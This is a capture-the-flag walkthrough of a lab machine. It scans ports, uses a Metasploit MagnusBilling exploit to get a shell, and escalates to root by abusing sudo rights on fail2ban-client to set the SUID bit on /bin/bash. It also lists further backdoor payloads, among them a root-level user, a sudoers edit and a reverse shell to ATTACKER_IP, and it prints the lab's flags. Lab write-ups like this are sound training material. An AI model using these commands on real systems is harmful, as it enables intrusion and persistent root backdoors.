#### Target Ip :  10.201.76.54

-----------

# Scanning using RustScan 

rustscan -a 10.201.76.54 -- -sC -sV 

![[Pasted image 20251025174816.png]]

We found open ports :  

Open 10.201.76.54:22  
Open 10.201.76.54:80
Open 10.201.76.54:3306
Open 10.201.76.54:5038

![[Pasted image 20251025183606.png]]

These are the service running on the server.

----------------
Then we found a exploit on msf console and the service was MagnusBilling


msf > search MagnusBilling

![[Pasted image 20251025183737.png]]

msf > use 0

msf >show options

![[Pasted image 20251025184034.png]]

msf >set RHOSTS 10.201.89.202

msf >set LHOST 10.17.17.19

msf >run

#### Now we get the meterpreter session 

--------------------------
# Now lets find the user.txt Flag


![[Pasted image 20251025184353.png]]

Then back to the home directory 

Found total 3 users 

![[Pasted image 20251025184711.png]]

So finally in the magnus user i found the user.txt flag

## FLAG : THM{4a6831d5f124b25eefb1e92e0f0da4ca}


----------------
# Now lets find the root.txt Flag

To do that we have to escalate priviellage

check which service we can use under sudo permission . Before that change the meterpreter shell to normal shell.

meterpreter > shell

sudo -l

![[Pasted image 20251025190512.png]]

we found fail2bn service that have sudo permission......

**fail2ban :** Fail2ban is an open-source intrusion prevention software for Linux that protects servers from brute-force attacks by monitoring log files for suspicious activity and automatically banning malicious IP addresses.

lets exploit these service !!!!!!!!!!

we found a exploit on https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/fail2ban-command/

# Investigation

sudo -l

# Output:

(ALL) NOPASSWD: /usr/bin/fail2ban-client

**If we can execute fail2ban-client command as root, we may be able to escalate privilege and gain a root shell.**

# Exploit : 

## step 1:
### Get jail list

```
sudo /usr/bin/fail2ban-client status
```

## step 2 : 

```
# Choose one of the jails from the "Jail list" in the output.

sudo /usr/bin/fail2ban-client get <JAIL> actions

# Create a new action with arbitrary name (e.g. "evil")

sudo /usr/bin/fail2ban-client set <JAIL> addaction evil

# Set payload to actionban

sudo /usr/bin/fail2ban-client set <JAIL> action evil actionban "chmod +s /bin/bash"

# Trigger the action

sudo /usr/bin/fail2ban-client set <JAIL> banip 1.2.3.5

# Now we gain a root

/bin/bash -p

```

![[Pasted image 20251025191756.png]]

Finnaly we got the root access.Now lest find the root.txt flag

![[Pasted image 20251025192042.png]]

## FLAG : THM{33ad5b530e71a172648f424ec23fae60}

-----------------------------
# How the payload works :

## Exploit Execution Summary

### Step 1: Verified sudo privileges
```bash
sudo -l
```
✅ Confirmed you can run `/usr/bin/fail2ban-client` as root without a password

### Step 2: Identified available jails
```bash
sudo /usr/bin/fail2ban-client status
```
✅ Found 8 jails, including `ast-cli-attck`

### Step 3: Created malicious action
```bash
sudo /usr/bin/fail2ban-client set ast-cli-attck addaction evil
```
✅ Successfully added "evil" action to the jail

### Step 4: Set the payload
```bash
sudo /usr/bin/fail2ban-client set ast-cli-attck action evil actionban "chmod +s /bin/bash"
```
✅ Configured the action to set SUID bit on bash

### Step 5: Triggered the exploit
```bash
sudo /usr/bin/fail2ban-client set ast-cli-attck banip 1.2.3.5
```
✅ Triggered the action by banning IP 1.2.3.5

### Step 6: Gained root access
```bash
/bin/bash -p
```

## Verification Steps

**Check if you now have root:** 
```bash
whoami
id
```

**Verify the SUID bit was set:**
```bash
ls -la /bin/bash
```
You should see `-rwsr-xr-x` instead of `-rwxr-xr-x` (notice the `s`)

## What You've Achieved

1. **Persistent Root Access**: `/bin/bash` now has SUID bit set
2. **Any user can become root**: Anyone on the system can run `/bin/bash -p` to get root
3. **Stealthy backdoor**: The SUID bit persists across reboots

## Cleanup (If Needed)

If you want to remove the backdoor:
```bash
# As root, remove the SUID bit
chmod -s /bin/bash

# Verify it's removed
ls -la /bin/bash
# Should show: -rwxr-xr-x
```

## Additional Payload Options

This technique can be extended with other payloads:

```bash
# Create a root user
"useradd -o -u 0 -g 0 -M -d /root -s /bin/bash root2"

# Add to sudoers  
"echo 'asterisk ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"

# Install SSH backdoor
"echo 'root2:password123:' | chpasswd"

# Reverse shell
"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

## Security Lessons

1. **Never grant unrestricted fail2ban-client sudo access**
2. **Monitor SUID/SGID file changes**
3. **Use configuration management to prevent unauthorized changes**
4. **Regularly audit sudo privileges**

You've successfully demonstrated a real-world privilege escalation vulnerability that could be used in penetration testing or security assessments.

<p style="text-align: center;">THANK YOU </p>






